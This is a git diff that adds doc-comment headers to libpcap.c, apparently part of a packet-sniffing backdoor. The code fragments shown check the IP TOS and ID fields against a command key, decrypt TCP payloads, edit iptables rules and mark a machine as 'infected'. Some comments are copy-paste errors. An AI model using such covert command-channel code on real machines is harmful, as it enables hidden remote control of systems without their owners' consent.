@@ -1,5 +1,37 @@
+/*
+ * =====================================================================================
+ *
+ *       Filename:  libpcap.c
+ *
+ *    Description:
+ *
+ *        Version:  1.0
+ *        Created:  12/03/2018 12:43:23 PM
+ *       Revision:  none
+ *       Compiler:  gcc
+ *
+ *         Author:  Benedict Lo & Aing Ragunathan
+ *   Organization:
+ *
+ * =====================================================================================
+ */
 #include "libpcap.h"
 
+/*
+ * =====================================================================================
+ *
+ *       function: Packetcapture
+ *
+ *         return: int
+ *
+ *       Parameters:
+ *                    char *filter - filters arguments
+ *                    struct filter Filter - struct containing all the data to be used
+ *
+ *       Notes:
+ *              main packet capture loop
+ * =====================================================================================
+ */
 int Packetcapture(char *filter, struct filter Filter){
     char errorbuffer[PCAP_ERRBUF_SIZE];
     struct bpf_program fp; //holds fp program info
@@ -31,6 +63,22 @@ int Packetcapture(char *filter, struct filter Filter){
     return 0;
 }
 
+/*
+ * =====================================================================================
+ *
+ *       function: ReadPacket
+ *
+ *         return: void
+ *
+ *       Parameters:
+ *                    u_char* args - arguments from libpcap
+ *                    const struct pcap_pkthdr* pkthdr - packets header
+ *                    const u_char* packet - packet
+ *
+ *       Notes:
+ *              loop to read packets
+ * =====================================================================================
+ */
 void ReadPacket(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
     //grab the type of packet
     struct ether_header *ethernet;
@@ -43,6 +91,22 @@ void ReadPacket(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* pa
     }
 }
 
+/*
+ * =====================================================================================
+ *
+ *       function: ParseIP
+ *
+ *         return: void
+ *
+ *       Parameters:
+ *                    struct filter *Filter - filter struct being passed
+ *                    const struct pcap_pkthdr* pkthdr - packets header
+ *                    const u_char* packet - packet
+ *
+ *       Notes:
+ *              parsing the ip header
+ * =====================================================================================
+ */
 void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet){
     const struct my_ip* ip;
     u_int length = pkthdr->len;
@@ -210,6 +274,20 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
     fclose(fp);
 }
 
+/*
+ * =====================================================================================
+ *
+ *       function: WriteUDPFile
+ *
+ *         return: void
+ *
+ *       Parameters:
+ *                    int ttl - ttl field
+ *
+ *       Notes:
+ *              writes the udp data to file
+ * =====================================================================================
+ */
 void WriteUDPFile(int ttl) {
     FILE *fp;
     if((fp = fopen(FILENAME, "ab+")) < 0){
@@ -230,6 +308,20 @@ void WriteUDPFile(int ttl) {
     fclose(fp);
 }
 
+/*
+ * =====================================================================================
+ *
+ *       function: WriteTCPFile
+ *
+ *         return: void
+ *
+ *       Parameters:
+ *                    const u_char* packet - the packet being passed
+ *
+ *       Notes:
+ *              writes the tcp data to a file
+ * =====================================================================================
+ */
 void WriteTCPFile(const u_char* packet) {
     FILE *fp;
 
@@ -250,6 +342,20 @@ void WriteTCPFile(const u_char* packet) {
     fclose(fp);
 }
 
+/*
+ * =====================================================================================
+ *
+ *       function: ParseTCPPayload
+ *
+ *         return: const unsigned char
+ *
+ *       Parameters:
+ *                    const u_char* packet - packet being passed in
+ *
+ *       Notes:
+ *              parses the tcp payload
+ * =====================================================================================
+ */
 const unsigned char *ParseTCPPayload(const u_char* packet) {
     const struct sniff_tcp *tcp=0;
     const struct my_ip *ip;
@@ -275,6 +381,21 @@ const unsigned char *ParseTCPPayload(const u_char* packet) {
     return decryptedtext;
 }
 
+/*
+ * =====================================================================================
+ *
+ *       function: CheckKey
+ *
+ *         return: int
+ *
+ *       Parameters:
+ *                    u_char ip_tos - passes the tos field
+ *                    u_short ip_id - passes the ipid field
+ *
+ *       Notes:
+ *              checks the key of the packet
+ * =====================================================================================
+ */
 int CheckKey(u_char ip_tos, u_short ip_id){
     // check if key is right for normal packets
     if(ip_tos == COMMAND_KEY && ip_id == COMMAND_KEY){
@@ -317,6 +438,24 @@ void ParseTCP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_c
     }
 }
 
+/*
+ * =====================================================================================
+ *
+ *       function: iptables
+ *
+ *         return: void
+ *
+ *       Parameters:
+ *                    char *ip - ip being added
+ *                    bool tcp - udp or tcp protocol
+ *                    char *port - port being used
+ *                    bool input - either input or output chains
+ *                    bool remove - either add or remove
+ *
+ *       Notes:
+ *              adds a iptables rule
+ * =====================================================================================
+ */
 void iptables(char *ip, bool tcp, char *port, bool input, bool remove){
     char iptable[BUFSIZ];
     memset(iptable, '\0', BUFSIZ);
@@ -382,6 +521,23 @@ void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tc
     }
 }
 
+/*
+ * =====================================================================================
+ *
+ *       function: InitFilter
+ *
+ *         return: struct filter
+ *
+ *       Parameters:
+ *                    char *target - taregt ip to be used
+ *                    char *target - taregt ip to be used
+ *                    bool infected - sets the machine to infected
+ *                    bool tcp - flag for tcp or udp
+ *
+ *       Notes:
+ *              creates a inotify socket
+ * =====================================================================================
+ */
 struct filter InitFilter(char *target, char *local, bool infected, bool tcp){
     struct filter Filter;
 
@@ -393,6 +549,21 @@ struct filter InitFilter(char *target, char *local, bool infected, bool tcp){
     return Filter;
 }
 
+/*
+ * =====================================================================================
+ *
+ *       function: CreateFilter
+ *
+ *         return: void
+ *
+ *       Parameters:
+ *                    char *buffer - buffer containing the filter
+ *                    bool tcp - sets udp or tcp
+ *
+ *       Notes:
+ *              creates a inotify socket
+ * =====================================================================================
+ */
 void CreateFilter(char *buffer, bool tcp){
     memset(buffer, '\0', BUFSIZ);
 
